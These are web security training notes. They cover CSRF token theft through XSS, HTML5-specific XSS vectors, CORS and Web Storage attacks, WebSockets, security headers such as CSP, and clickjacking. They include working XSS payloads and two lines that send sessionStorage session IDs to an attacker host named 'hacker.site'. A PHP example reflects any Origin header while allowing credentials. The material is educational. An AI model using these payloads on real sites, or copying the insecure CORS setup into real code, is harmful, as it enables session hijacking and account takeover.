<h5 id="-request-a-valid-form-with-a-valid-token-"><strong>Request a valid form with a valid token</strong></h5>
<p>During the first step, we need the HTML of the page where the target form is located.</p>
<p>Worst case scenario, the XSS is not located on the same page of the target form; therefore, we cannot access the DOM directly using JavaScript. Thus, we need to GET the HTML source of the page.</p>
<p>To get the page&#39;s HTML using <code>XMLHttpRequest</code> is simple.</p>
<pre><code class="lang-js"><span class="hljs-keyword">var</span> xhr = <span class="hljs-keyword">new</span> XMLHttpRequest();
xhr.onreadystatechange = <span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">()</span> </span>{
    <span class="hljs-keyword">if</span> (xhr.readyState == <span class="hljs-number">4</span>) {
        <span class="hljs-keyword">var</span> htmlSource = xhr.responseText;
        <span class="hljs-comment">// more operations</span>
    }
}
xhr.open(<span class="hljs-string">'GET'</span>, <span class="hljs-string">'http://victim.site/csrf-form-page.html'</span>, <span class="hljs-literal">true</span>);
xhr.send();
</code></pre>
<p>The first step is to request a valid form with a valid token by using some form of the following jQuery code:</p>
<pre><code class="lang-js">jReq = jQuery.get(<span class="hljs-string">'http://victim.site/csrf-form-page.html'</span>,
    <span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">()</span> </span>{
        <span class="hljs-keyword">var</span> htmlSource = jReq.responseText;
        <span class="hljs-comment">// more operations</span>
    })
</code></pre>
<h5 id="-extract-the-valid-token-from-the-source-code-"><strong>Extract the valid token from the source code</strong></h5>
<p>The second step requires us to extract the Anti-CSRF token from the page. In the best-case scenario, we can access the DOM quite easily (see the following example):</p>
<pre><code class="lang-js"><span class="hljs-keyword">var</span> token = document.getElementByName(<span class="hljs-string">'csrf_token'</span>)[<span class="hljs-number">0</span>].<span class="hljs-keyword">value</span>;
</code></pre>
<p>Of course, this depends on the implementation context.</p>
<p>Whereas, it is slightly different if the XSS is located on a different page. In this case, we need to extract the token from the result of the first step (a string containing the HTML of the target page). There are multiple options available to both inspect the string result and extract the anti-CSRF token.</p>
<h5 id="-forge-the-form-with-the-stolen-token-"><strong>Forge the form with the stolen token</strong></h5>
<p>The final step, once we have a valid token, is to add the anti CSRF token in the forged form and send the attack by using the techniques we have seen in the previous sections.</p>
<h2 id="-labs-"><strong>Labs</strong></h2>
<ul>
<li><a href="https://portswigger.net/web-security/all-labs#cross-site-request-forgery-csrf">https://portswigger.net/web-security/all-labs#cross-site-request-forgery-csrf</a></li>
<li><a href="http://github.com/Yavuzlar/VulnLab">http://github.com/Yavuzlar/VulnLab</a></li>
</ul>
<hr>
<h1 id="-html5-attacks-"><strong>HTML5 Attacks</strong></h1>
<h3 id="-introduction-"><strong>Introduction</strong></h3>
<p>In recent years, we have witnessed one of the most important improvements of the WWW core language: the 5th major revision of HTML (HTML5). This modification is real upgrade of the old HTML 4, XHTML, and the HTML DOM Level 2, which is designed to deliver rich content both cross-platform, and without the need of additional plugins.</p>
<p>HTML5 is not a single, big language rewrite; instead, it’s a collection of several individual features, such as:</p>
<ul>
<li>multimedia</li>
<li>3d, graphics &amp; effects</li>
<li>storage</li>
<li>Semantics, device access</li>
<li>performance &amp; intergration</li>
</ul>
<p>It should be of no surprise that with more features comes a larger attack surface; thus, the potential for more security vulnerabilities. We do not need to analyze the entire HTML5 RFC and its related features; however, what we are going to explore in this Recap section is the major features that are interesting from a security perspective.</p>
<h3 id="-semantics-"><strong>Semantics</strong></h3>
<p>One of the features introduced by HTML5 is the enrichment of the semantics that web developers can give to their applications. These include new <strong>media elements, form types, attributes</strong>, and many others. From a security point of view, these become new attack vectors and ways to bypass security measures!</p>
<p>Outdated security measures, that are based on blacklisting filters for example, may not know the presence of new elements useful in conducting attacks such as XSS. Let’s see some simple examples.</p>
<h4 id="-form-elements-"><strong>Form Elements</strong></h4>
<p>The <code>&lt;keygen&gt;</code> element is one of the new Form Elements. It was introduced to generate a key-pair client side. The most interesting attribute it supports is <strong>autofocus</strong>. This is useful in triggering XSS without user interaction. See the below example:</p>
<pre><code class="lang-html">&lt;form action=<span class="hljs-string">"#"</span> method=<span class="hljs-string">"<span class="hljs-keyword">GET</span>"</span>&gt;
    Encryption: &lt;keygen name=<span class="hljs-string">"security"</span> autofocus onfocus=<span class="hljs-string">"alert(1);"</span>&gt;
&lt;/form&gt;
</code></pre>
<h4 id="-media-elements-"><strong>Media Elements</strong></h4>
<p>Among the Media Elements, both <code>&lt;video</code> and <code>&lt;audio&gt;</code> are commonly used to evade XSS filters. In addition <code>&lt;source&gt;</code>, <code>&lt;track&gt;</code>, <code>&lt;embed&gt;</code> and are also useful due to the fact that they support the <code>src</code> attribute.</p>
<pre><code class="lang-html"><span class="hljs-tag">&lt;<span class="hljs-name">embed</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"http://hacker.site/evil.swf"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">embed</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"javascript:alert(1)"</span>&gt;</span>
</code></pre>
<h4 id="-semantic-structural-elements-"><strong>Semantic / Structural Elements</strong></h4>
<p>There are many other elements introduced to improve the semantic and the structure of a page, such as: <code>&lt;article&gt;</code>, <code>&lt;figure&gt;</code>, <code>&lt;footer&gt;</code>, <code>&lt;header&gt;</code>, <code>&lt;main&gt;</code>, <code>&lt;mark&gt;</code>, <code>&lt;nav&gt;</code>, <code>&lt;progress&gt;</code>, <code>&lt;section&gt;</code>, <code>&lt;summery&gt;</code>, <code>&lt;time&gt;</code>, etc.</p>
<p>All of them support <strong>Global</strong> and <strong>Event Attributes</strong>, both old and new.</p>
<h4 id="-attributes-"><strong>Attributes</strong></h4>
<p>There is also a huge list of new events and some interesting examples are: <code>onhashchange</code>, <code>onformchange</code>, <code>onscroll</code>, <code>onresize</code> ...</p>
<pre><code class="lang-html">&lt;<span class="hljs-selector-tag">body</span> onhashchange=<span class="hljs-string">"alert(1)"</span>&gt;
    &lt;<span class="hljs-selector-tag">a</span> herf=<span class="hljs-string">"#"</span>&gt;Click me!&lt;/a&gt;
</code></pre>
<h3 id="-offline-storage-"><strong>Offline &amp; Storage</strong></h3>
<p>The web is evolving so quickly that it has been necessary to introduce the option to work with web applications offline, where the entire application can run within a browser. This is a single page application that runs entirely offline utilizing some of the techniques. Some of the major features, related to this evolution are <strong>Application Cache</strong> and <strong>Web Storage</strong> (alias <strong>Client-side storage</strong> or <strong>Offline storage</strong>).</p>
<h4 id="-web-storage-"><strong>Web Storage</strong></h4>
<p>From a security point of view, the biggest concern introduced with Web Storage is that users are not aware of the kind of data to store. The attack scenarios may vary from <strong>Session Hijacking</strong>, <strong>User Tracking</strong>, <strong>Disclosure of Confidential Data</strong>, as well as a new way to <strong>store attack vectors</strong>.</p>
<h5 id="-session-hijacking-"><strong>Session Hijacking</strong></h5>
<p>For example, if a developer chooses to store session IDs by using <code>sessionStorage</code> instead of cookies, it is still possible to perform session hijacking by leveraging an XSS flaw.</p>
<pre><code class="lang-js"><span class="hljs-keyword">new</span> <span class="hljs-type">Image</span>().src =<span class="hljs-string">"http://hacker.site/SID?"</span>+escape(sessionStorage.getItem(<span class="hljs-string">'sessionID'</span>));
</code></pre>
<p>Furthermore, web storage solutions do not implement security mechanisms to mitigate the risk of malicious access to the stored information (see <strong>HttpOnly</strong>).</p>
<p>Clearly, using this incorrect approach, makes session hijacking much easier.</p>
<p>With offline web applications, the most critical security issue is <strong>Cache Poisoning</strong>. Even if this was also possible with old standard HTML cache features, the offline applications can also cache SSL resources and the root directory of a website.</p>
<h3 id="-device-access-"><strong>Device Access</strong></h3>
<p>One of the most frightening features introduced by the HTML5 specs is <a href="http://www.w3.org/TR/geolocation-API/">Geolocation API</a> . This is a way to provide scripted access to identify a user&#39;s position based on GPS coordinates (latitude and longitude).</p>
<p>With the Geolocation API, every allowed website is able to query the position of the users, thus causing major privacy concerns. This API access can not only be used for <strong>user tracking</strong>, physical and cross-domain, but also for <strong>breaking anonymity</strong>.</p>
<p>Another interesting feature introduced to control devices is <strong>Fullscreen</strong> . This is an API that allows a single element (images, videos, etc.) to be viewed in full-screen mode.</p>
<p>The Fullscreen API can be used for <strong>Phishing Attacks</strong>. For example, sending the phishing page in full screen mode and loading a fake victim website in the background with an image that simulates the browser header, address bar, etc.</p>
<h3 id="-performance-integration-connectivity-"><strong>Performance, Integration &amp; Connectivity</strong></h3>
<p>With HTML5, many new features were introduced to both improve <strong>performance</strong> and <strong>user interaction</strong>, such as <strong>Drag</strong> and <strong>Drop</strong>, <strong>HTML editing</strong> and <strong>Workers</strong> (<strong>Web</strong> and <strong>Shared</strong>). Improvements were also made on <strong>communications</strong>, with features such as <code>WebSocket</code> and <code>XMLHttpRequest2</code>.</p>
<p>The new attack scenarios vary from <strong>interactive XSS</strong>, with Drag and Drop, to <strong>Remote shell</strong>, <strong>port scanning</strong>, and web <strong>based botnets</strong> exploiting the new communication features like <strong>WebSocket</strong>. It is also possible to manipulate the <strong>history</strong> stack with methods to add and remove locations, thus allowing <strong>history tampering</strong> attacks.</p>
<p>From a security point of view, the most important features introduced are <strong>Policy , Resource Sharing</strong>, <strong>Cross-Origin Resource Sharing</strong>, <strong>Cross-Document Messaging</strong> and the strengthening of <code>iframes</code> with the <strong>Sandboxed</strong> attribute.</p>
<h2 id="-exploiting-html5-"><strong>Exploiting HTML5</strong></h2>
<p>Let’s now consider the various attack scenarios, which may affect the most widespread technologies introduced by HTML5.</p>
<h3 id="-cors-attack-scenarios-"><strong>CORS Attack Scenarios</strong></h3>
<p>With both the evolution of the web, and with websites increasingly becoming more dynamic, the <strong>same origin restrictions</strong> began to become more restrictive rather than helpful. In order to relax the <strong>SOP</strong>, a new specification has been introduced called: <strong>Cross-Origin Resource Sharing</strong>.</p>
<p>The <strong>CORS</strong> mechanism works similarly to Flash and Silverlight’s cross-domain policy files; however, instead of an XML configuration file it uses a set of <strong>HTTP headers</strong>.</p>
<p>These allow both server and browser to communicate in relation to which requests are or not allowed.</p>
<h4 id="-universal-allow-"><strong>Universal Allow</strong></h4>
<p>The first CORS response headers is <code>Access-Control-Allow-Origin</code>, which indicates whether a resource can be shared or not. This is based upon it returning the value of the <code>Origin</code> request header, <code>*</code> or <code>null</code> in the response.</p>
<pre><code><span class="hljs-attr">Access-Control-Allow-Origin</span> = <span class="hljs-string">"Access-Control-Allow-Origin"</span> <span class="hljs-string">":"</span> origin-list-<span class="hljs-literal">or</span>-<span class="hljs-literal">null</span> | <span class="hljs-string">"*"</span>
</code></pre><h5 id="-allow-by-wildcard-value-"><strong>Allow by Wildcard Value</strong></h5>
<p>Often, developers use the wildcard value <code>*</code> to allow any website to make a CORs query to a specific page.</p>
<p>Generally this is not a required behavior, but rather a matter of laziness of the implementer. This is one of the most common misconfigurations with CORS headers.</p>
<p>There are several ways to abuse this implementation. For example, if XSS is found on the page served with <code>Access-Control-Allow-Origin *</code>, it can be used to infect or impersonate users.</p>
<p>This can also be used to bypass intranet websites. For example, tricking internal users to access a controlled website and making a <strong>COR query</strong> to their internal resources in order to read the responses.</p>
<p>Another option is to use the users as a proxy to exploit vulnerabilities, therefore leveraging the fact that the <strong>HTTP Referrer</strong> header is often not logged.</p>
<p>In CORS, the <code>Access-Control-Allow-Credentials</code> indicates that the request can include <strong>user credentials</strong>. This is pretty interesting if we also have the wildcard <code>*</code> set on the allowed origin header!</p>
<p>Unfortunately, the specification explicitly denies this behavior.</p>
<blockquote>
<p>[!Note]
The string <code>*</code> cannot be used for a resource that supports credentials.</p>
<h5 id="-allow-by-server-side-"><strong>Allow by Server-side</strong></h5>
</blockquote>
<p>So, what can developers do? They can simply adjust the implementation server-side, allowing COR from all domains with credentials included!</p>
<pre><code class="lang-php"><span class="php"><span class="hljs-meta">&lt;?php</span>
 header(<span class="hljs-string">'Access-Control-Allow-Origin: '</span> + $_SERVER[<span class="hljs-string">'HTTP_ORIGIN'</span>]);
 header(<span class="hljs-string">'Access-Control-Allow-Credentials: true'</span>);</span>
</code></pre>
<p>By design, this implementation clearly allows CSRF. Any origin will be able to read the anti-CSRF tokens from the page, therefore consenting any domain on the internet to impersonate the web application users.</p>
<h4 id="-weak-access-control-"><strong>Weak Access Control</strong></h4>
<p>After we have &quot;secured&quot; the Universal Allow issue, we know that we only trust certain origins. To do this, CORS specifications provide a request header named <strong>Origin</strong>. It indicates where the COR or Preflight Request originates from.</p>
<p>Since the <strong>Origin</strong> header cannot be spoofed from the browser, one of the most common mistakes is to establish trust only on this header. Usually this is done in order to perform access control for pages that provide sensitive information.</p>
<p>Of course, the header can be spoofed by creating requests outside of the browsers. For example, one can use a proxy or using tool like cURL, Wget, etc.</p>
<h5 id="-check-origin-example-"><strong>Check Origin Example</strong></h5>
<p>Let’s look at the following example.</p>
<p>Suppose that <a href="http://victim.site">http://victim.site</a> supports CORS and, not only reveals sensitive information to friendly origins (like <a href="http://friend.site">http://friend.site</a>), but also reveals simple information to everyone.</p>
<p>By using <code>cURL</code>, it is possible to bypass the access control by setting the <strong>Origin</strong> header to the allowed value: <a href="http://friend.site">http://friend.site</a>. In so doing, it is possible to read the sensitive information sent.</p>
<h4 id="-intranet-scanning-"><strong>Intranet Scanning</strong></h4>
<p>It is also possible to abuse COR in order to perform time based Intranet scanning. This can be done by sending XHR to either an arbitrary IP address or domain names and, depending on the <strong>response time</strong>, establish whether a host is up or a specific port is open.</p>
<h4 id="-remote-web-shell-"><strong>Remote Web Shell</strong></h4>
<p>In the “Cross-site Script” module, there were several ways to steal client-side cookies, given a Cross-Site-Scripting flaw has been detected.</p>
<p>Another issue with CORS, in this context, is related to Remote Web Shells. These are particularly interesting when we find valid XSS vulnerabilities.</p>
<p>If an XSS flaw is found in an application that supports CORS, an attacker can hijack the victim session, establishing a communication channel between the victim’s browser and the attacker. That allows the attacker to do anything the victim can do in that web application context.</p>
<h3 id="-storage-attack-scenarios-"><strong>Storage Attack Scenarios</strong></h3>
<p>HTML5 comes with new specifications which are useful for <strong>storing</strong> and <strong>managing</strong> structured data on the client. This is a revolutionary way to replace existing <strong>cookie limitations</strong> and store a great deal of information client side. This information is both easily accessible through JavaScript and doesn’t need to be sent in every request.</p>
<p>Under the HTML5 storage umbrella, there are several technologies and just as many specifications. Some of them are no longer in active maintenance such as <strong>WebSQL</strong> . Others, however, are completely stable (i.e. W3C Recommendation) or in a proposal stage (i.e. W3C Candidate Recommendation).</p>
<h4 id="-web-storage-"><strong>Web Storage</strong></h4>
<p>Web Storage is the first stable HTML5 specification that rules two well known mechanisms: <strong>Session Storage</strong> and <strong>Local Storage</strong>. The implementations are similar to cookies and they are also known as <strong>key-value storage</strong> and <strong>DOM storage</strong>. Anything can be converted to a string or serialized and stored.</p>
<pre><code class="lang-js"><span class="hljs-selector-tag">window</span>.(localStorage|sessionStorage)<span class="hljs-selector-class">.setItem</span>(<span class="hljs-string">'key'</span>, <span class="hljs-string">'value'</span>);
</code></pre>
<p>From a security point of view, Web Storageintroduced a new set of attack scenarios. The main issue with this technology is that developers are not aware of the <a href="http://www.w3.org/TR/webstorage/#security-storage">security concerns</a> presented in this specification, which clearly reports the security risks this feature may introduce.</p>
<h5 id="-session-hijacking-"><strong>Session Hijacking</strong></h5>
<p>A developer may use <strong>Session Storage</strong> (and/or <strong>Local Storage</strong>) as an alternative to <strong>HTTP cookies</strong> by storing the session identifiers in session storage.</p>
<p>In the case of an XSS attack, <strong>Web Storage</strong> is a property of the <strong>Window</strong> object; therefore, it is accessible via the <strong>DOM</strong> and, in a similar fashion to <strong>cookies</strong>, it can be compromised.</p>
<p>The exploitation is similar to the one used for cookies, but the only difference is in the API used to retrieve the values.</p>
<pre><code class="lang-html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
    <span class="hljs-keyword">new</span> Image().src = <span class="hljs-string">"http://hacker.site/receive.php?c="</span> + <span class="hljs-built_in">escape</span>(sessionStorage.getItem(<span class="hljs-string">'sessionID'</span>));
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p>Despite <code>document.cookie</code>, the attacker needs to be more precise because the name of the <strong>key</strong> used to store the session ID may change. This is because of its dependence on the web application targeted. However, the advantages using this technique are greater.</p>
<p><strong>HTTP cookies</strong> have attributes, such as <strong>HTTPOnly</strong>, that were introduced to stop the session hijacking phenomena. This security measure, however, is completely missing for Web Storage technologies, making it <strong>completely inappropriate</strong> for storing both session identifiers and sensitive information.</p>
<h5 id="-cross-directory-attacks-"><strong>Cross-directory Attacks</strong></h5>
<p>Another important difference is that, unlike <strong>HTTP cookies</strong>, there is no feature to restrict the access by pathname, making the <strong>Web Storage</strong> content available in the whole origin. This may also introduce <strong>Cross-directory attacks</strong>.</p>
<p>This attack may apply to web applications that use <strong>Web Storage</strong> in hosting environments that assign different directories per user.</p>
<p>For example, if an XSS flaw is found in the university path <code>uni.edu/~professorX</code>, it is possible to read all stored data in all the directories available in the university domain <code>uni.edu</code>.</p>
<p>Using the same way, a malicious user could create a script to read stored data of all users that visit his page.</p>
<h5 id="-using-tracking-and-confidential-data-disclosure-"><strong>Using Tracking and Confidential Data Disclosure</strong></h5>
<p>It is possible to perform <strong>User Tracking</strong> if websites use <strong>Web Storage</strong> objects to store information about users&#39; behaviors rather than <strong>HTTP Cookies</strong>.</p>
<p>Of course, if the stored data is sensitive in nature, the impact could be greater.</p>
<h4 id="-indexeddb-"><strong>IndexedDB</strong></h4>
<p>Even though <strong>Web Storage</strong> can store large number of objects locally, it has some limitations. For example, when working with structured data, it does not provide an efficient mechanism to search over values. It also does not provide a means to search the storage for duplicate values for a key.</p>
<p>To address these limitations, the other two options that HTML5 introduced under the storage specifications are: IndexedDB and Web SQL Database. The latter was deprecated by W3C in 2010, making it “uninteresting” for us!</p>
<p>Indexed Database API is an HTML5 API introduced for high performance searches on client-side storage. The idea is that this storage would hold significant amounts of structured, indexed data, thereby giving developers an efficient client-side querying mechanism.</p>
<p>It is a <strong>transactional</strong> technology, however, not relational. The database system saves key-value pairs in object stores and allows searching data by using indexes also known as <strong>keys</strong>.</p>
<p>From a security point of view, the attack scenarios introduced by this feature are more or less the same of those introduced by <strong>Web Storage</strong>. The primary risks are related to <strong>information leakage</strong> and <strong>information spoofing</strong>.</p>
<p><strong>IndexedDB</strong> follows the <strong>Same-origin-Policy</strong> but limits the use to HTTP and HTTPS in all browser except Internet Explorer . This also allows <code>ms-wwa</code> and <code>ms-wwa-web</code> protocols for their apps in the new Windows UI format.</p>
<h3 id="-web-messaging-attack-scenarios-"><strong>Web Messaging Attack Scenarios</strong></h3>
<p>In order to soften the <strong>SOP</strong> and allow documents to communicate with one other, regardless of their source domain, HTML5 introduced specification called <strong>Web Messaging</strong>. Web This is also referred as <strong>Cross Document Messaging</strong> or simply with the name of the API <strong>postMessage</strong>.</p>
<p>This simply means that communications between the embedded <strong>Iframes</strong> and the hosting website are now possible. However, as usual, each time something new is introduced, we face the same types of potential security risks.</p>
<p>In this case, the hosting web page can receive content from other domains without the server being involved, thus bypassing possible server-side security checks. We have an increment of the attack surface being that there are additional iframes that can talk together.</p>
<h4 id="-dom-xss-"><strong>DOM XSS</strong></h4>
<p>The vulnerability we will most likely come across is <strong>DOM Based XSS</strong>. This occurs if the <strong>postMessage</strong> data received is used without validation. For example, using <strong>DOM sinks</strong>, such as <code>innerHTML</code>, <code>write</code>, etc., we can recreate the vulnerability for us to review:</p>
<pre><code class="lang-js"><span class="hljs-title">var</span> hello = document.getElementById(<span class="hljs-string">"helloBox"</span>);
<span class="hljs-title">hello</span>.innerHTML = <span class="hljs-string">"Hello "</span> + e.<span class="hljs-class"><span class="hljs-keyword">data</span>;</span>

// interHTML -&gt; <span class="hljs-type">HTML</span> <span class="hljs-type">Element</span> <span class="hljs-type">Sink</span>
// e.<span class="hljs-class"><span class="hljs-keyword">data</span>    -&gt; <span class="hljs-type">User</span> controlled values</span>
</code></pre>
<h4 id="-origin-issue-"><strong>Origin Issue</strong></h4>
<p>The <strong>Web Messaging Protocol</strong> allows the presence of the <strong>Origin</strong> header field. This should be used to protect against unauthorized cross origin use of a WebSocket server by scripts that are using the WebSocket API in a web browser.</p>
<p>The <strong>Origin</strong> header is not mandatory, but it can help reduce the attack surface by both limiting the interaction with trusted origins and reducing the likelihood of a <strong>Client-side DoS</strong>. This can be done in JavaScript as follows:</p>
<pre><code class="lang-js"><span class="hljs-params">...</span>
<span class="hljs-keyword">if</span> (e.origin != <span class="hljs-string">"http://trusted.site"</span>) {
    <span class="hljs-comment">// Origin not allowed</span>
    <span class="hljs-keyword">return</span>;
}
<span class="hljs-params">...</span>
</code></pre>
<p>This is not full protection because, as we have seen with <strong>CORS</strong>, even if it cannot be done via browser, the <strong>origin</strong> header can be spoofed by creating requests outside the browser.</p>
<h3 id="-web-sockets-attack-scenarios-"><strong>Web Sockets Attack Scenarios</strong></h3>
<p>The long-awaited real evolution in web technology is <strong>Web Sockets</strong>, a standardized way to perform real-time communications between clients and servers over the Internet.</p>
<p>The two standards that rule this technology are The <strong>WebSocket Protocol</strong>, also known as <strong>RFC 6455</strong> and <strong>WebSocket API</strong>.</p>
<p><strong>WebSockets</strong> introduced some new attack scenarios similar to those seen with <strong>CORS</strong>. If we are able to execute JavaScript code inside the victim browser, its possible to establish a <strong>Web Socket</strong> connection and perform our malicious operations.</p>
<h4 id="-data-validation-"><strong>Data Validation</strong></h4>
<p>The primary security issue here, as often is the case, is <strong>Data Validation</strong>. Like <strong>CORS</strong>, <strong>Web Messaging</strong> and other mechanisms that are accepting inputs from foreign origins, we should rigorously test <strong>Web Sockets</strong> for data payloads.</p>
<p>For example, one of the simplest data validation issues to find may be Cross-Site scripting, and while looking for it, we might also find other types of Injections concerning both client-side and server-side.</p>
<h4 id="-mitm-"><strong>MiTM</strong></h4>
<p>In addition, the <strong>WebSocket Protocol</strong> standard defines two schemes for web socket connections: <code>ws</code> for unencrypted and <code>wss</code> for the encrypted. If the implementation uses the <strong>unencrypted</strong> channel, we have a <strong>MiTM</strong> issue whereby, anybody on the network can see and manipulate the traffic.</p>
<h4 id="-remote-shell-"><strong>Remote Shell</strong></h4>
<p>If we are able to execute JavaScript code on the victim browser, by either exploiting an XSS flaw or tricking the victim into visiting a malicious website, we could conveniently establish a full Web Socket connection and, as a result, have a <strong>Remote Shell</strong> active until the window/tab is closed.</p>
<h2 id="-html5-security-measures-"><strong>HTML5 Security Measures</strong></h2>
<p>We have seen the main security concerns introduced with the new HTML5 features. This is insufficient for a complete HTML5 module because the specifications have also introduced security enhancements. These enhancements, except for <strong>iframe sandboxing</strong>, are <strong>HTTP headers</strong>. These were introduced to provide a mechanism for the server to instruct the browser in order to introduce addition security controls.</p>
<h3 id="-security-headers-x-xss-protection-"><em>*Security Headers: X-XSS-Protection</em></h3>
<p>The <code>X-XSS-Protection</code> header was introduced by Explorer Internet and later adopted by Google Chrome and WebKit based browsers (Safari, Opera, etc.). This occurred in order to to protect user agents against a subset of <strong>Reflected Cross-site Scripting</strong> attacks. The header is not standardized.</p>
<h3 id="-security-headers-x-frame-options-"><strong>Security Headers: X-Frame-Options</strong></h3>
<p>In order to prevent <strong>ClickJacking</strong>, the <code>X-Frame-Options</code> response header was introduced. This header introduced a way for the server to instruct the browser on whether to display the transmitted content in frames of other web pages.</p>
<p>The syntax is simple:</p>
<pre><code>X-<span class="hljs-keyword">Frame</span>-<span class="hljs-keyword">Options</span>: value
</code></pre><ul>
<li><strong>DENY</strong>: The page cannot be displayed in a frame, regardless of the site attempting to do so.</li>
<li><strong>SAMEORIGIN</strong>: The page can only be displayed in a frame on the same origin as the page itself.</li>
<li><strong>ALLOW-FROM-URI</strong>: The page can only be displayed in a frame on the specified origin.<h3 id="-security-headers-x-content-type-options-"><strong>Security Headers: X-Content-Type-Options</strong></h3>
</li>
</ul>
<p>To indicate the purpose of a specific resource, web servers use the response header <code>Content-Type</code> which contains a standard MIME type (e.g. <strong>text/html</strong>, <strong>image/png</strong>, etc.) with some optional parameters (IE: character set).</p>
<p>There are a variety of circumstances in which browsers do not recognize or retain a valid <strong>Content-Type</strong> value; therefore, they do content-sniffing to guess the appropriate MIME type. This, especially in Internet Explorer, has introduced a series of attack scenarios <a href="http://www.adambarth.com/papers/2009/barth-caballero-song.pdf">Content Sniffing XSS</a>.</p>
<p>This header instructs the browser to “not guess” the content type of the resource and trust of the <code>Content-Type</code> header.</p>
<p>The only value defined is <strong>nosniff</strong>:</p>
<pre><code>X-Content-<span class="hljs-keyword">Type</span>-<span class="hljs-keyword">Options</span>: nosniff
</code></pre><h3 id="-security-headers-content-security-policy-"><strong>Security Headers: Content Security Policy</strong></h3>
<p>The <strong>CSP</strong>, or <strong>Content Security Policy</strong>, is a defense mechanism that can significantly reduce the risk impact of a broad class of content injection vulnerabilities. These include <strong>XSS</strong> and <strong>UI Redressing</strong> in modern browsers.</p>
<blockquote>
<p>[!Note]
The <strong>CSP</strong> is not a first line defense mechanism against content injection vulnerabilities; however, it is a <strong>defense-in depth</strong> solution.</p>
</blockquote>
<p>The <strong>CSP</strong> uses a collection of <a href="http://www.w3.org/TR/CSP/#directives">directives</a> in order to define a specific set of whitelisted sources of trusted content. It instructs the browser to only execute or render resources from the allowed sources.</p>
<p>The specification provides a set of possible <strong>directives</strong>, but the most important and commonly used is <code>script-src</code>:</p>
<pre><code>Content-Security-<span class="hljs-string">Policy:</span> script-src <span class="hljs-string">'self'</span> <span class="hljs-string">https:</span><span class="hljs-comment">//other.web.site</span>
</code></pre><p>Directives work in <strong>default-allow</strong> mode. This simply means that if a specific directive does not have a policy defined, then it is equal to <code>*</code>; thus, every source is a valid source. For example, if the CSS and style markup directive <strong>style-src</strong> is not set, the browser can then load stylesheets from anywhere without restriction.</p>
<p>To both avoid this type of behavior and define a common rule for all the directives unset, the specification provides the <strong>default-src</strong> directive. Clearly, it will be applied to all the unspecified directives.</p>
<p>For example:</p>
<pre><code><span class="hljs-attribute">Content-Security-Policy</span>: <span class="hljs-keyword">default-src</span> <span class="hljs-string">'self'</span>
</code></pre><p>With <strong>CSP</strong>, it is also possible to deny resources. For example, if the web application does not need plugins or to be framed, then the policy can be enriched as follow:</p>
<pre><code><span class="hljs-attribute">Content-Security-Policy</span>: <span class="hljs-keyword">default-src</span> https://my.web.site; <span class="hljs-keyword">object-src</span> <span class="hljs-string">'none'</span>; <span class="hljs-keyword">frame-src</span> <span class="hljs-string">'none'</span>
</code></pre><p><strong>None</strong> returns an empty set for the allowed sources.</p>
<p>In addition to the source list values, there are four keywords that are also allowed. It is important to realize that they must be used with single-quotes, otherwise they refer to server named <em>none</em>, <em>self</em>, etc...</p>
<ul>
<li><strong>&#39;none&#39;</strong> - no sources</li>
<li><strong>&#39;self&#39;</strong> - current origin, but not its subdomains</li>
<li><strong>&#39;unsafe-inline&#39;</strong> - allows inline JavaScript and CSS</li>
<li><strong>&#39;unsafe-eval&#39;</strong> - allows text-to-JavaScript sinks like <strong>eval</strong>, <strong>alert</strong>, <strong>setTimeout</strong>, …<h2 id="-ui-redressing-the-x-jacking-art-"><strong>UI Redressing: The x-Jacking Art</strong></h2>
</li>
</ul>
<p>Despite what many people think, <strong>UI Redressing</strong> is not a single attack technique, but rather a category of attacks. These aim to change visual elements in a user interface in order to conceal malicious activities. Common examples of <strong>UI Redressing</strong> attacks include overlaying a visible button with an invisible one, changing the cursor position and manipulating other elements in the user interface.</p>
<p>Often times, UI redressing techniques are also referred to as <strong>ClickJacking</strong>, <strong>LikeJacking</strong>, <strong>StrokeJacking</strong>, <strong>FileJacking</strong> and many others.</p>
<h3 id="-clickjacking-"><strong>ClickJacking</strong></h3>
<p>A Basic ClickJacking attack uses a nested iframe from a target website and a little bit of CSS magic. This “magic” often leverages position, opacity and many other CSS attributes.</p>
<p>A nice example can be a simple game where the victim needs to find and click on a character. As shown in the next slide, in the background there is a submission button or whatever the attack chooses to trigger an action.</p>
<h3 id="-likejacking-"><strong>LikeJacking</strong></h3>
<p>A potential scenario of the previous <strong>Basic ClickJacking</strong> is <strong>LikeJacking</strong> . There is nothing revolutionary in this type attack. The targets are social networks and their features. For example, the button <strong>Like</strong> used in Facebook could be used in order to say &quot;I Like&quot; this resource, which can be a video, photo, a company page, etc.</p>
<p>With the widespread use of Facebook, the amount of &quot;Likes” is often a measure of perceived popularity for a particular product (event, brand, etc.). The more the &quot;likes&quot;, the more influential it can be. That is why many organizations who specialize in selling Facebook likes and friends, have appeared over the years.</p>
<h3 id="-strokejacking-"><strong>StrokeJacking</strong></h3>
<p>StrokeJacking, a technique to hijack keystrokes, is proof that <strong>UI Redressing</strong> is not only all about hijacking clicks. This method can be very useful in the exploiting a code injection flaw. Generally, this is XSS and the payload must be manually typed.</p>
<h3 id="-new-attack-vectors-in-html5-"><strong>New Attack Vectors in HTML5</strong></h3>
<p>There are many other variations of UI Redressing but what we are looking for in this module are the new attack vectors introduced in HTML5.</p>
<h4 id="-drag-and-drop-"><strong>Drag-and-Drop</strong></h4>
<p>For years, developers have used several libraries to create awesome UI animations, including Drag and Drop. With HTML5, this mechanism has been transformed into something natively supported by all desktop-based browsers.</p>
<p>The specification allows us to Drag data across different origins; therefore, there is no need to care about the SOP because it does not apply to the <strong>DnD API</strong>! Of course, this is pointless to say, but this API introduced several new attacks. The most interesting &quot;interpretation&quot; of this API has been presented by <a href="https://web.archive.org/web/20160413235555/http:/www.contextis.com/documents/5/Context-Clickjacking_white_paper.pdf">Paul Stone</a> . He has proven powerful attack vectors that mix <strong>Drag-and-Drop</strong> with <strong>ClickJacking</strong> techniques.</p>
<h5 id="-text-field-injection-"><strong>Text Field Injection</strong></h5>
<p>The first possible technique allows the attacker-controller to drag data into hidden text fields/forms on different origins. Despite a simple click or typing characters, hijacking drag gestures is much more complex.</p>
